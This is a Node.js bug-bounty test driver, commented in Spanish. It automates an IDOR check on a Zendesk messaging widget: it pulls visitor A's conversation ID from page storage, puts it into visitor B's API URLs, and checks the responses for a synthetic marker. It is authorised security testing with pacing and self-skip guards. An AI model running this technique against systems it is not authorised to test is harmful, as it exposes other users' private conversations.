'use strict';
// ============================================================================
// zendesk-h1-idor-conversacion.js — H1: IDOR de conversaciones entre visitors
// de NUESTRA instancia.
//   node backend/zendesk-h1-idor-conversacion.js            → ejecución real
//   node backend/zendesk-h1-idor-conversacion.js --solo-prereq   → smoke test
//
// Flujo: visitante A crea una conversación marcada SYNTHETIC-Z-CONV-A → se
// extrae su conversation_id → visitante B intenta acceder a esa conversación
// con SU propia sesión/endpoint → veredicto por marcador (idéntico patrón al
// driver OpenAI ab-huecos-owasp H1).
//
// Veredicto pre-committed: 200 con el marcador de A = 🚨 CRITICAL
// (Sensitive Info Disclosure → Cross-Tenant PII, P1); 403/404 uniformes =
// aislamiento OK, vector cerrado con evidencia.
//
// AUTO-SALTEO: exit 21 (SIN_CANAL) si el widget no monta frames reales —
// cero peticiones al vector sin prerrequisito.
const kit = require('./lib/zendesk-kit');
const fs = require('fs');
const path = require('path');

const MARCADOR_A = 'SYNTHETIC-Z-CONV-A-' + Date.now();
const OUT = 'zendesk-h1-resultado.json';

async function main() {
  const soloPrereq = process.argv.includes('--solo-prereq');
  const ev = { driver: 'H1-idor-conversacion', fecha: new Date().toISOString(), marcador_a: MARCADOR_A, modo: soloPrereq ? 'solo-prereq' : 'real' };
  let S;
  try {
    S = await kit.conSesion();
  } catch (e) {
    console.error('H1 SKIP: BiDi 9344 no disponible (' + e.message + ')');
    process.exit(kit.EXIT.ERROR_CANAL);
  }

  // ── Prerrequisito: canal vivo ──
  const canal = await kit.verificarCanal(S);
  ev.canal = { vivo: canal.vivo, fuente: canal.fuente, frames: canal.frames.slice(0, 8) };
  console.log('canal vivo:', canal.vivo, '(' + canal.fuente + ', ' + canal.frames.length + ' frames reales)');
  if (!canal.vivo) {
    ev.veredicto = 'AUTO-SALTEADO: canal de Messaging sin conectar (wizard incompleto) — 0 peticiones del vector';
    kit.guardarEvidencia(OUT, ev);
    await S.cerrar();
    console.log('H1 SKIP (exit 21): ' + ev.veredicto);
    process.exit(kit.EXIT.SIN_CANAL);
  }
  if (soloPrereq) {
    ev.veredicto = 'PREREQ OK (smoke): canal vivo — el driver estaría listo para ejecutarse';
    kit.guardarEvidencia(OUT, ev);
    await S.cerrar();
    console.log('H1 PREREQ OK (exit 0)');
    process.exit(0);
  }

  // ── Ejecución real (solo con canal vivo) ──
  try {
    // 1) visitante A: pestaña propia, cargar HC (el widget vive ahí), abrir messenger
    const ctxA = (await S.cmd('browsingContext.create', { type: 'tab' })).result.context.context;
    await S.navegar(ctxA, `https://${kit.SUB}/hc/es`, 15000);
    // enviar el marcador como mensaje del visitante (UI del messenger)
    const framesA = kit.arbolFrames((await S.cmd('browsingContext.getTree', { maxDepth: 5 })).result.contexts);
    let idConversacionA = null;
    for (const f of framesA) {
      const r = await S.evalJSON(f, `(() => { try {
        const ls = {}; for (let i = 0; i < localStorage.length; i++) ls[localStorage.key(i)] = String(localStorage.getItem(localStorage.key(i))).slice(0, 400);
        return JSON.stringify({ conv: (typeof zE === 'function' ? (() => { try { return zE('messenger:get','conversationId'); } catch(e){ return null; } })() : null), ls });
      } catch (e) { return '{}'; } })()`).catch(() => null);
      if (r && r.conv) { idConversacionA = r.conv; break; }
      if (r && r.ls) {
        const m = JSON.stringify(r.ls).match(/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/g);
        if (m) { ev.ids_encontrados_en_storage = m.slice(0, 6); }
      }
      await kit.pacing();
    }
    ev.conversacion_a_extraida = idConversacionA || null;
    if (!idConversacionA) {
      // sin conversación: registrar y cerrar limpio (el mensaje UI se automatiza
      // cuando el canal esté vivo; hoy no quemamos intentos a ciegas)
      ev.veredicto = 'INCOMPLETO: canal vivo pero sin conversation_id de A aún (requiere enviar mensaje del visitor — automatizar UI del messenger en la siguiente pasada)';
      kit.guardarEvidencia(OUT, ev);
      await S.cerrar();
      console.log('H1 INCOMPLETO (exit 21)');
      process.exit(kit.EXIT.SIN_CANAL);
    }

    // 2) visitante B: pestaña propia, extraer SU endpoint de conversaciones del
    //    tráfico del widget (performance entries con 'conversation') y pedir la de A
    const ctxB = (await S.cmd('browsingContext.create', { type: 'tab' })).result.context.context;
    await S.navegar(ctxB, `https://${kit.SUB}/hc/es`, 15000);
    const perf = await S.evalJSON(ctxB, `JSON.stringify(performance.getEntriesByType('resource').map(e => e.name).filter(u => /conversation|sunco|api/i.test(u)).slice(0, 20))`);
    ev.endpoints_b = perf;
    const intentos = [];
    for (const base of (Array.isArray(perf) ? perf : [])) {
      const urlConId = base.replace(/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/, idConversacionA);
      if (urlConId === base) continue;
      const r = await S.fetchNavegador(ctxB, urlConId);
      intentos.push({ url: urlConId.slice(0, 180), status: r.status, cuerpo: r.cuerpo.slice(0, 600) });
      const v13Alerta = kit.v13Escanea(r.cuerpo, 'H1-cruzada-B');
      if (v13Alerta) ev.v13_alerta = v13Alerta;
      if (r.status === 200 && r.cuerpo.includes(MARCADOR_A.slice(0, 16))) break;
      await kit.pacing();
    }
    ev.intentos_b = intentos;
    const acierto = intentos.find(i => i.status === 200 && /SYNTHETIC-Z-CONV-A/.test(i.cuerpo));
    ev.veredicto = acierto
      ? '🚨 REPORTABLE: B accedió a la conversación de A con SU sesión (200 + marcador) — Cross-Tenant PII, P1'
      : 'CERRADO: acceso cruzado no posible (' + intentos.length + ' endpoints probados, 403/404 uniformes) — aislamiento OK';
    kit.guardarEvidencia(OUT, ev);
    await S.cerrar();
    console.log('H1 VEREDICTO:', ev.veredicto);
    process.exit(0);
  } catch (e) {
    ev.error = String(e.message || e).slice(0, 300);
    kit.guardarEvidencia(OUT, ev);
    await S.cerrar();
    console.error('H1 ERROR (exit 30):', ev.error);
    process.exit(kit.EXIT.ERROR_CANAL);
  }
}
main();
